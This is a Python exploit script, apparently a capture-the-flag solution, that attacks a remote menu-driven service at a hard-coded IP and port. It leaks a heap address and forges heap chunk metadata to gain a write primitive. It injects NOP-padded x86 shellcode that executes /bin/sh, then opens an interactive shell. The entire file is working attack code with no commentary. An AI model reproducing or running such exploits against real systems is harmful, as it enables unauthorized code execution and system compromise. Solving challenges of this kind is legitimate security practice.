#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
import re

host = "133.130.90.210"
port = 6666

sock = make_conn(host,port)

def add(sock,types):
    recvuntil(sock,"Choice:")
    sendline(sock,"1")
    recvuntil(sock,":")
    sendline(sock,str(types))

def edit(sock,index,types,data):
    recvuntil(sock,"Choice:")
    sendline(sock,"3")
    recvuntil(sock,"edit:")
    sendline(sock,str(index))
    recvuntil(sock,"edit:")
    sendline(sock,str(types))
    recvuntil(sock,":")
    sendline(sock,data)

def show(sock,index):
    recvuntil(sock,"Choice:")
    sendline(sock,"4")
    recvuntil(sock,":")
    sendline(sock,str(index))
    data = recvuntil(sock,"exit.")
    return data

add(sock,1)
edit(sock,0,2,"a"*0xdb)
heap = unpack32(show(sock,0).split('\n')[2].ljust(4,'\x00'))
print "heap:",hex(heap)

payload = pack32(0xe1)
payload += pack32(0x804b000)
payload = payload.ljust(0xd4,'\x00')
payload += pack32(0x320)
payload += pack32(0)
payload += pack32(heap+0xc)
edit(sock,0,2,payload)
add(sock,1)
payload2 = "\x31\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
payload2 = payload2.ljust(0xd4,'\x90')
payload2 += pack32(0xe1)
payload2 += pack32(0x804b000)
payload2 += pack32(0)

edit(sock,0,2,payload2)
add(sock,1)
edit(sock,2,1,"aaaabbbb" + pack32(heap+0xc))
inter(sock)

